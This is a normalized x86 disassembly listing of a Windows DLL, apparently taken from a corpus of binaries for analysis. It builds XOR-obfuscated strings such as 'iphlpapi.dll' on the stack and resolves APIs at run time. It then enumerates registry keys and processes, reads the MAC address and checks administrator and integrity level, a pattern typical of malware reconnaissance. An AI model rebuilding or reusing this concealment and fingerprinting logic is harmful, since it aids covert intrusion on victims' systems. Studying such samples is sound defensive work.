call esi
add esp 0x10
jmp r-xdata
lea ecx [ ebp - 0x2bc ]
push ecx
push 0x20019
push ebx
push [ ebp + eax * 4 - 0x224 ]
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x68 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
inc [ ebp - 0x300 ]
jmp r-xdata
push edi
call sub_1000d360
pop ecx
mov ecx [ ebp + 0xc ]
sub ecx eax
push ecx
push [ ebp - 0x300 ]
call sub_10006c81
pop ecx
push eax
push edi
call esi
push edi
call sub_1000d360
mov ecx [ ebp + 0xc ]
sub ecx eax
push ecx
push rw-data
push edi
call esi
add esp 0x1c
mov [ ebp - 0x410 ] ebx
mov eax [ ebp - 0x300 ]
cmp eax 0xa
jge r-xdata
push edi
call sub_1000d360
mov ecx [ ebp + 0xc ]
sub ecx eax
push ecx
push rw-data
push edi
call esi
add esp 0x10
lea ecx [ ebp - 0xf4 ]
push ecx
push 0x20019
push ebx
push [ ebp + eax * 4 - 0x2b8 ]
push [ ebp - 0x2bc ]
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
push edi
call sub_1000d360
mov ecx [ ebp + 0xc ]
sub ecx eax
push ecx
push rw-data
push edi
call esi
add esp 0x10
inc [ ebp - 0x410 ]
jmp r-xdata
push 0x105
push ebx
lea eax [ ebp - 0x408 ]
push eax
call sub_1000d316
mov eax [ ebp - 0x410 ]
cmp eax 0x3
jge r-xdata
sub_100060e6
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x84
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x7c ] ebx
push 0x1
pop eax
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x28 ] 0x16
mov [ ebp - 0x27 ] 0xf
mov [ ebp - 0x26 ] 0x17
mov [ ebp - 0x25 ] 0x13
mov [ ebp - 0x24 ] 0xf
mov [ ebp - 0x23 ] 0x1e
mov [ ebp - 0x22 ] 0xf
mov [ ebp - 0x21 ] 0x16
mov [ ebp - 0x20 ] 0x51
mov [ ebp - 0x1f ] 0x1b
mov [ ebp - 0x1e ] 0x13
mov [ ebp - 0x1d ] 0x13
and [ ebp - 0x1c ] bl
mov [ ebp - 0x78 ] 0x38
mov [ ebp - 0x77 ] 0x1a
mov [ ebp - 0x76 ] 0xb
mov [ ebp - 0x75 ] 0x3e
mov [ ebp - 0x74 ] 0x1b
mov [ ebp - 0x73 ] 0x1e
mov [ ebp - 0x72 ] 0xf
mov [ ebp - 0x71 ] 0xb
mov [ ebp - 0x70 ] 0x1a
mov [ ebp - 0x6f ] 0xd
mov [ ebp - 0x6e ] 0xc
mov [ ebp - 0x6d ] 0x36
mov [ ebp - 0x6c ] 0x11
mov [ ebp - 0x6b ] 0x19
mov [ ebp - 0x6a ] 0x10
and [ ebp - 0x69 ] bl
mov [ ebp - 0x60 ] 0x5a
mov [ ebp - 0x5f ] 0x4f
mov [ ebp - 0x5e ] 0x4d
mov [ ebp - 0x5d ] 0x7
mov [ ebp - 0x5c ] 0x5a
mov [ ebp - 0x5b ] 0x4f
mov [ ebp - 0x5a ] 0x4d
mov [ ebp - 0x59 ] 0x7
mov [ ebp - 0x58 ] 0x5a
mov [ ebp - 0x57 ] 0x4f
mov [ ebp - 0x56 ] 0x4d
mov [ ebp - 0x55 ] 0x7
mov [ ebp - 0x54 ] 0x5a
mov [ ebp - 0x53 ] 0x4f
mov [ ebp - 0x52 ] 0x4d
mov [ ebp - 0x51 ] 0x7
mov [ ebp - 0x50 ] 0x5a
mov [ ebp - 0x4f ] 0x4f
mov [ ebp - 0x4e ] 0x4d
mov [ ebp - 0x4d ] 0x7
mov [ ebp - 0x4c ] 0x5a
mov [ ebp - 0x4b ] 0x4f
mov [ ebp - 0x4a ] 0x4d
mov [ ebp - 0x49 ] 0x7
mov [ ebp - 0x48 ] 0x5a
mov [ ebp - 0x47 ] 0x4f
mov [ ebp - 0x46 ] 0x4d
mov [ ebp - 0x45 ] 0x7
mov [ ebp - 0x44 ] 0x5a
mov [ ebp - 0x43 ] 0x4f
mov [ ebp - 0x42 ] 0x4d
mov [ ebp - 0x41 ] 0x7
and [ ebp - 0x40 ] bl
mov [ ebp - 0x38 ] 0x5a
mov [ ebp - 0x37 ] 0x4f
mov [ ebp - 0x36 ] 0x47
mov [ ebp - 0x35 ] 0x7
mov [ ebp - 0x34 ] 0x45
mov [ ebp - 0x33 ] 0x45
and [ ebp - 0x32 ] bl
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x78 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x60 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x38 ]
push eax
call sub_100075ee
add esp 0x10
cmp [ ebp + 0x8 ] ebx
je r-xdata
mov [ ebp - 0x64 ] ebx
lea eax [ ebp - 0x28 ]
push eax
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x3c ] eax
cmp eax ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x64 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0x78 ]
push ecx
push eax
call [ GetProcAddress@IAT ]
mov edi eax
mov [ ebp - 0x80 ] edi
cmp edi ebx
je r-xdata
lea eax [ ebp - 0x7c ]
push eax
push ebx
call edi
mov [ ebp - 0x68 ] eax
cmp eax 0x6f
jne r-xdata
cmp eax ebx
je r-xdata
push [ ebp - 0x7c ]
call [ malloc@IAT ]
pop ecx
mov esi eax
mov [ ebp - 0x2c ] esi
cmp esi ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
call sub_10006501
jmp r-xdata
mov [ ebp - 0x30 ] esi
lea eax [ ebp - 0x7c ]
push eax
push esi
call edi
mov [ ebp - 0x68 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x84 ] ebx
mov edi [ lstrlenA@IAT ]
push [ ebp + 0x8 ]
call sub_1000d360
sub ebx eax
push ebx
push rw-data
push [ ebp + 0x8 ]
call [ strncat@IAT ]
add esp 0x10
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0x84 ] ebx
ja r-xdata
push [ ebp + 0x8 ]
call edi
mov [ ebp - 0x84 ] eax
mov ecx [ esi + 0x190 ]
mov [ ebp - 0x90 ] ecx
push ecx
lea ecx [ ebp - 0x38 ]
push ecx
mov ecx ebx
sub ecx eax
push ecx
mov ecx [ ebp + 0x8 ]
add eax ecx
push eax
call [ _snprintf@IAT ]
mov eax [ ebp + 0x8 ]
add ebx eax
and [ ebx ] 0x0
push eax
call sub_1000d360
mov [ ebp - 0x84 ] eax
movzx ecx [ esi + 0x19b ]
push ecx
movzx ecx [ esi + 0x19a ]
push ecx
movzx ecx [ esi + 0x199 ]
push ecx
movzx ecx [ esi + 0x198 ]
push ecx
movzx ecx [ esi + 0x197 ]
push ecx
movzx ecx [ esi + 0x196 ]
push ecx
movzx ecx [ esi + 0x195 ]
push ecx
movzx ecx [ esi + 0x194 ]
push ecx
lea ecx [ ebp - 0x60 ]
push ecx
mov ecx [ ebp + 0xc ]
sub ecx eax
push ecx
mov ecx [ ebp + 0x8 ]
add eax ecx
push eax
call [ _snprintf@IAT ]
add esp 0x40
and [ ebx ] 0x0
push [ ebp + 0x8 ]
call edi
mov [ ebp - 0x84 ] eax
mov ecx [ ebp + 0xc ]
sub ecx eax
push ecx
push rw-data
push [ ebp + 0x8 ]
call [ strncat@IAT ]
add esp 0xc
and [ ebx ] 0x0
push [ ebp + 0x8 ]
call edi
mov [ ebp - 0x84 ] eax
and [ ebp - 0x8c ] 0x0
lea eax [ esi + 0x1ac ]
mov [ ebp - 0x88 ] eax
mov eax [ ebp + 0xc ]
sub eax [ ebp - 0x84 ]
push eax
push rw-data
push [ ebp + 0x8 ]
call [ strncat@IAT ]
add esp 0xc
and [ ebx ] 0x0
push [ ebp + 0x8 ]
call edi
mov [ ebp - 0x84 ] eax
mov esi [ esi ]
mov [ ebp - 0x2c ] esi
mov ecx [ ebp + 0xc ]
sub ecx eax
push ecx
push rw-data
push [ ebp + 0x8 ]
call [ strncat@IAT ]
add esp 0xc
and [ ebx ] 0x0
push [ ebp + 0x8 ]
call edi
mov [ ebp - 0x84 ] eax
xor ebx ebx
jmp r-xdata
add eax 0x4
push eax
call edi
mov [ ebp - 0x94 ] eax
mov ecx [ ebp - 0x84 ]
add eax ecx
cmp eax [ ebp + 0xc ]
ja r-xdata
cmp esi ebx
mov ebx [ ebp + 0xc ]
je r-xdata
mov eax [ ebp - 0x88 ]
add eax 0x4
push eax
push rw-data
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x84 ]
sub ecx eax
push ecx
mov ecx [ ebp + 0x8 ]
add eax ecx
push eax
call [ _snprintf@IAT ]
add esp 0x10
and [ ebx ] 0x0
push [ ebp + 0x8 ]
call edi
mov [ ebp - 0x84 ] eax
mov eax [ ebp - 0x88 ]
mov eax [ eax ]
mov [ ebp - 0x88 ] eax
test eax eax
je r-xdata
mov eax [ ebp - 0x88 ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
sub eax [ ebp - 0x84 ]
push eax
push rw-data
push [ ebp + 0x8 ]
call [ strncat@IAT ]
add esp 0xc
and [ ebx ] 0x0
push [ ebp + 0x8 ]
call edi
mov [ ebp - 0x84 ] eax
jmp r-xdata
sub_10006501
call sub_1000d4c4
test eax eax
je r-xdata
cmp [ ebp - 0x3c ] ebx
je r-xdata
mov [ ebp - 0x64 ] ebx
cmp [ ebp - 0x30 ] ebx
je r-xdata
push [ ebp - 0x3c ]
call [ FreeLibrary@IAT ]
retn
push [ ebp - 0x30 ]
call [ free@IAT ]
pop ecx
mov [ ebp - 0x30 ] ebx
sub_10006551
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x24 ] esi
lea eax [ ebp - 0x24 ]
push eax
call sub_10007578
xor al al
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_100065e7
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x194
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x5c ] 0x1
xor ebx ebx
mov [ ebp - 0x6c ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x68 ] 0x14
mov [ ebp - 0x67 ] 0x1a
mov [ ebp - 0x66 ] 0xd
mov [ ebp - 0x65 ] 0x11
mov [ ebp - 0x64 ] 0x1a
mov [ ebp - 0x63 ] 0x13
mov [ ebp - 0x62 ] 0x4c
mov [ ebp - 0x61 ] 0x4d
mov [ ebp - 0x60 ] bl
mov [ ebp - 0x34 ] 0x3c
mov [ ebp - 0x33 ] 0xd
mov [ ebp - 0x32 ] 0x1a
mov [ ebp - 0x31 ] 0x1e
mov [ ebp - 0x30 ] 0xb
mov [ ebp - 0x2f ] 0x1a
mov [ ebp - 0x2e ] 0x2b
mov [ ebp - 0x2d ] 0x10
mov [ ebp - 0x2c ] 0x10
mov [ ebp - 0x2b ] 0x13
mov [ ebp - 0x2a ] 0x17
mov [ ebp - 0x29 ] 0x1a
mov [ ebp - 0x28 ] 0x13
mov [ ebp - 0x27 ] 0xf
mov [ ebp - 0x26 ] 0x4c
mov [ ebp - 0x25 ] 0x4d
mov [ ebp - 0x24 ] 0x2c
mov [ ebp - 0x23 ] 0x11
mov [ ebp - 0x22 ] 0x1e
mov [ ebp - 0x21 ] 0xf
mov [ ebp - 0x20 ] 0xc
mov [ ebp - 0x1f ] 0x17
mov [ ebp - 0x1e ] 0x10
mov [ ebp - 0x1d ] 0xb
mov [ ebp - 0x1c ] bl
mov [ ebp - 0x58 ] 0x2f
mov [ ebp - 0x57 ] 0xd
mov [ ebp - 0x56 ] 0x10
mov [ ebp - 0x55 ] 0x1c
mov [ ebp - 0x54 ] 0x1a
mov [ ebp - 0x53 ] 0xc
mov [ ebp - 0x52 ] 0xc
mov [ ebp - 0x51 ] 0x4c
mov [ ebp - 0x50 ] 0x4d
mov [ ebp - 0x4f ] 0x39
mov [ ebp - 0x4e ] 0x16
mov [ ebp - 0x4d ] 0xd
mov [ ebp - 0x4c ] 0xc
mov [ ebp - 0x4b ] 0xb
mov [ ebp - 0x4a ] bl
mov [ ebp - 0x48 ] 0x2f
mov [ ebp - 0x47 ] 0xd
mov [ ebp - 0x46 ] 0x10
mov [ ebp - 0x45 ] 0x1c
mov [ ebp - 0x44 ] 0x1a
mov [ ebp - 0x43 ] 0xc
mov [ ebp - 0x42 ] 0xc
mov [ ebp - 0x41 ] 0x4c
mov [ ebp - 0x40 ] 0x4d
mov [ ebp - 0x3f ] 0x31
mov [ ebp - 0x3e ] 0x1a
mov [ ebp - 0x3d ] 0x7
mov [ ebp - 0x3c ] 0xb
mov [ ebp - 0x3b ] bl
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x68 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x34 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x58 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x48 ]
push eax
call sub_100075ee
add esp 0x10
lea eax [ ebp - 0x68 ]
push eax
call [ LoadLibraryA@IAT ]
mov edi eax
mov [ ebp - 0x74 ] edi
cmp edi ebx
je r-xdata
mov [ ebp - 0x5c ] bl
lea eax [ ebp - 0x34 ]
push eax
push edi
mov esi [ GetProcAddress@IAT ]
call esi
mov [ ebp - 0x1a4 ] eax
lea eax [ ebp - 0x58 ]
push eax
push edi
call esi
mov [ ebp - 0x1a0 ] eax
lea eax [ ebp - 0x48 ]
push eax
push edi
call esi
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x1a4 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x5c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x1a0 ] ebx
je r-xdata
cmp eax ebx
je r-xdata
push ebx
push 0x2
call [ ebp - 0x1a4 ]
mov esi eax
mov [ ebp - 0x6c ] esi
cmp esi 0xffffffff
je r-xdata
mov [ ebp - 0x19c ] ebx
push 0x49
pop ecx
xor eax eax
lea edi [ ebp - 0x198 ]
[ edi ]
mov [ ebp - 0x19c ] 0x128
lea eax [ ebp - 0x19c ]
push eax
push esi
call [ ebp - 0x1a0 ]
call sub_1000d360
mov ecx 0x1000
sub ecx eax
push ecx
push rw-data
push [ ebp + 0x8 ]
call [ strncat@IAT ]
add esp 0x10
jmp r-xdata
call sub_1000d360
mov ecx 0x1000
sub ecx eax
push ecx
lea eax [ ebp - 0x178 ]
push eax
push [ ebp + 0x8 ]
mov edi [ strncat@IAT ]
call edi
push [ ebp + 0x8 ]
call sub_1000d360
mov ecx 0x1000
sub ecx eax
push ecx
push rw-data
push [ ebp + 0x8 ]
call edi
add esp 0x20
lea eax [ ebp - 0x19c ]
push eax
push esi
call [ ebp - 0x70 ]
jmp r-xdata
mov [ ebp - 0x4 ] ebx
call sub_10006867
jmp r-xdata
test eax eax
push [ ebp + 0x8 ]
je r-xdata
sub_100068d6
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x38 ] 0xf
mov [ ebp - 0x37 ] 0xc
mov [ ebp - 0x36 ] 0x1e
mov [ ebp - 0x35 ] 0xf
mov [ ebp - 0x34 ] 0x16
xor ebx ebx
mov [ ebp - 0x33 ] bl
mov [ ebp - 0x2c ] 0x3a
mov [ ebp - 0x2b ] 0x11
mov [ ebp - 0x2a ] 0xa
mov [ ebp - 0x29 ] 0x12
mov [ ebp - 0x28 ] 0x2f
mov [ ebp - 0x27 ] 0xd
mov [ ebp - 0x26 ] 0x10
mov [ ebp - 0x25 ] 0x1c
mov [ ebp - 0x24 ] 0x1a
mov [ ebp - 0x23 ] 0xc
mov [ ebp - 0x22 ] 0xc
mov [ ebp - 0x21 ] 0x1a
mov [ ebp - 0x20 ] 0xc
mov [ ebp - 0x1f ] bl
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x4 ] ebx
push 0x1
pop esi
mov [ ebp - 0x4 ] esi
lea eax [ ebp - 0x38 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x2c ]
push eax
call sub_100075ee
pop ecx
pop ecx
lea eax [ ebp - 0x38 ]
push eax
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x30 ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x1c ] bl
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
push eax
call [ GetProcAddress@IAT ]
mov [ ebp - 0x1040 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
call sub_10006a64
jmp r-xdata
mov [ ebp - 0x103c ] ebx
lea ecx [ ebp - 0x103c ]
push ecx
mov edi 0x1000
push edi
lea ecx [ ebp - 0x1038 ]
push ecx
call eax
cmp eax esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_1000d360
sub edi eax
push edi
push rw-data
push [ ebp + 0x8 ]
call [ strncat@IAT ]
add esp 0x10
mov esi [ ebp - 0x103c ]
shr esi 0x2
mov [ ebp - 0x1150 ] esi
push 0x105
push ebx
lea eax [ ebp - 0x114c ]
push eax
call sub_1000d316
sub_10006a95
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x50
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x34 ] 0x3a
mov [ ebp - 0x33 ] 0x11
mov [ ebp - 0x32 ] 0xa
mov [ ebp - 0x31 ] 0x12
mov [ ebp - 0x30 ] 0x2f
mov [ ebp - 0x2f ] 0xd
mov [ ebp - 0x2e ] 0x10
mov [ ebp - 0x2d ] 0x1c
mov [ ebp - 0x2c ] 0x1a
mov [ ebp - 0x2b ] 0xc
mov [ ebp - 0x2a ] 0xc
mov [ ebp - 0x29 ] 0x32
mov [ ebp - 0x28 ] 0x10
mov [ ebp - 0x27 ] 0x1b
mov [ ebp - 0x26 ] 0xa
mov [ ebp - 0x25 ] 0x13
mov [ ebp - 0x24 ] 0x1a
mov [ ebp - 0x23 ] 0xc
mov [ ebp - 0x22 ] bl
mov [ ebp - 0x50 ] 0x38
mov [ ebp - 0x4f ] 0x1a
mov [ ebp - 0x4e ] 0xb
mov [ ebp - 0x4d ] 0x32
mov [ ebp - 0x4c ] 0x10
mov [ ebp - 0x4b ] 0x1b
mov [ ebp - 0x4a ] 0xa
mov [ ebp - 0x49 ] 0x13
mov [ ebp - 0x48 ] 0x1a
mov [ ebp - 0x47 ] 0x3d
mov [ ebp - 0x46 ] 0x1e
mov [ ebp - 0x45 ] 0xc
mov [ ebp - 0x44 ] 0x1a
mov [ ebp - 0x43 ] 0x31
mov [ ebp - 0x42 ] 0x1e
mov [ ebp - 0x41 ] 0x12
mov [ ebp - 0x40 ] 0x1a
mov [ ebp - 0x3f ] 0x3e
mov [ ebp - 0x3e ] bl
mov [ ebp - 0x3c ] 0xa
mov [ ebp - 0x3b ] 0x11
mov [ ebp - 0x3a ] 0x14
mov [ ebp - 0x39 ] 0x11
mov [ ebp - 0x38 ] 0x10
mov [ ebp - 0x37 ] 0x8
mov [ ebp - 0x36 ] 0x11
mov [ ebp - 0x35 ] bl
cmp [ ebp + 0x10 ] ebx
jne r-xdata
push [ ebp + 0x14 ]
push ebx
push [ ebp + 0x10 ]
call sub_1000d316
xor al al
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10006b91
add esp 0xc
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x34 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x50 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x3c ]
push eax
call sub_100075ee
add esp 0xc
lea eax [ ebp - 0x34 ]
push eax
mov edi [ ebp + 0x8 ]
push [ edi ]
mov esi [ GetProcAddress@IAT ]
call esi
mov [ ebp - 0x54 ] eax
lea eax [ ebp - 0x50 ]
push eax
push [ edi ]
call esi
mov [ ebp - 0x58 ] eax
cmp [ ebp - 0x54 ] ebx
je r-xdata
mov [ ebp - 0x1c ] bl
cmp eax ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x14 ]
lea esi [ eax - 0x1 ]
push esi
lea eax [ ebp - 0x3c ]
push eax
push [ ebp + 0x10 ]
call [ strncpy@IAT ]
add esp 0xc
push [ ebp + 0xc ]
push ebx
push 0x410
call [ OpenProcess@IAT ]
mov edi eax
mov [ ebp - 0x20 ] edi
cmp edi ebx
je r-xdata
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x60 ] ebx
lea eax [ ebp - 0x60 ]
push eax
push 0x4
lea eax [ ebp - 0x5c ]
push eax
push edi
call [ ebp - 0x54 ]
test eax eax
je r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp - 0x5c ]
push edi
call [ ebp - 0x58 ]
neg eax
sbb eax eax
neg eax
mov [ ebp - 0x1c ] al
jmp r-xdata
mov [ ebp - 0x4 ] ebx
call sub_10006c50
jmp r-xdata
sub_10006c81
mov eax [ esp + 0x4 ]
cmp eax 0x9
ja r-xdata
mov eax rw-data
retn
jmp [ eax * 4 + jump_table_10006cd3 ]
mov eax rw-data
retn
mov eax rw-data
retn
mov eax rw-data
retn
mov eax rw-data
retn
mov eax rw-data
retn
mov eax rw-data
retn
mov eax rw-data
retn
mov eax rw-data
retn
mov eax rw-data
retn
mov eax rw-data
retn
sub_10006cfb
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xac
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x28 ] bl
mov [ ebp - 0x27 ] bl
mov [ ebp - 0x26 ] bl
mov [ ebp - 0x25 ] bl
mov [ ebp - 0x24 ] bl
mov [ ebp - 0x23 ] 0x5
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
push 0x1
pop esi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0xbc ] 0x94
lea eax [ ebp - 0xbc ]
push eax
call [ GetVersionExA@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0xac ] esi
jne r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
cmp [ ebp - 0xac ] 0x2
jne r-xdata
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov [ ebp - 0x4 ] ebx
call sub_10006dd4
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x220
push 0x20
push 0x2
lea eax [ ebp - 0x28 ]
push eax
call [ AllocateAndInitializeSid@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax ebx
je r-xdata
cmp [ ebp - 0xb8 ] 0x4
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x20 ]
push ebx
call sub_10007315
test eax eax
je r-xdata
push [ ebp - 0x20 ]
call [ FreeSid@IAT ]
mov [ ebp - 0x20 ] ebx
sub_10006e05
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x41c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
or edi 0xffffffff
mov [ ebp - 0x24 ] edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
push 0x1
pop esi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x2c ] 0x100
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x230 ]
push eax
call [ GetUserNameW@IAT ]
test eax eax
je r-xdata
mov esi edi
jmp r-xdata
mov [ ebp - 0x42c ] bl
mov [ ebp - 0x42b ] bl
mov [ ebp - 0x42a ] bl
mov [ ebp - 0x429 ] bl
mov [ ebp - 0x428 ] bl
mov [ ebp - 0x427 ] 0x5
lea eax [ ebp - 0x294 ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x12
push esi
lea eax [ ebp - 0x42c ]
push eax
call [ AllocateAndInitializeSid@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x4 ] ebx
call sub_10006f40
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x82
push ebx
lea eax [ ebp - 0x320 ]
push eax
call sub_1000d316
mov eax esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10006f75
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x108
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
push 0x1
pop edi
mov [ ebp - 0xc0 ] edi
xor ebx ebx
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xbc ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] edi
call [ GetCurrentProcessId@IAT ]
mov [ ebp - 0xb8 ] eax
mov esi 0x94
push esi
push ebx
lea eax [ ebp - 0xac ]
push eax
call sub_1000d316
sub_10006fda
add esp 0xc
mov [ ebp - 0xac ] esi
lea eax [ ebp - 0xac ]
push eax
call [ GetVersionExA@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0xc0 ] ebx
cmp [ ebp - 0x9c ] 0x2
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0xc0 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] ebx
call sub_1000715d
jmp r-xdata
call sub_10006cfb
test eax eax
jne r-xdata
mov [ ebp - 0xc0 ] edi
call sub_10006e05
test eax eax
jne r-xdata
call sub_100071d7
mov [ ebp - 0xb4 ] eax
cmp eax 0xffffffff
je r-xdata
call sub_1000753a
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
mov edi 0x4000
cmp eax edi
jae r-xdata
mov [ ebp - 0xc0 ] ebx
mov [ ebp - 0xc4 ] ebx
lea eax [ ebp - 0xc4 ]
push eax
push [ ebp - 0xb8 ]
call sub_100082ce
pop ecx
pop ecx
mov [ ebp - 0xc8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0xd0 ] bl
mov [ ebp - 0xcf ] bl
mov [ ebp - 0xce ] bl
mov [ ebp - 0xcd ] bl
mov [ ebp - 0xcc ] bl
mov [ ebp - 0xcb ] 0x10
lea ecx [ ebp - 0xbc ]
push ecx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push eax
push 0x1
lea eax [ ebp - 0xd0 ]
push eax
mov esi [ AllocateAndInitializeSid@IAT ]
call esi
test eax eax
je r-xdata
cmp [ ebp - 0xa8 ] 0x6
jb r-xdata
mov [ ebp - 0xf4 ] eax
push eax
call [ CloseHandle@IAT ]
mov [ rw-data ] ebx
jmp r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
mov [ ebp - 0xc0 ] edi
jmp r-xdata
lea eax [ ebp - 0xb0 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push edi
push 0x1
lea eax [ ebp - 0xd0 ]
push eax
call esi
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
call sub_1000753a
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push [ ebp - 0xb0 ]
push [ ebp - 0xbc ]
push [ ebp - 0xb8 ]
call sub_10008c2b
add esp 0x18
test eax eax
je r-xdata
sub_1000715d
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xb0 ] ebx
je r-xdata
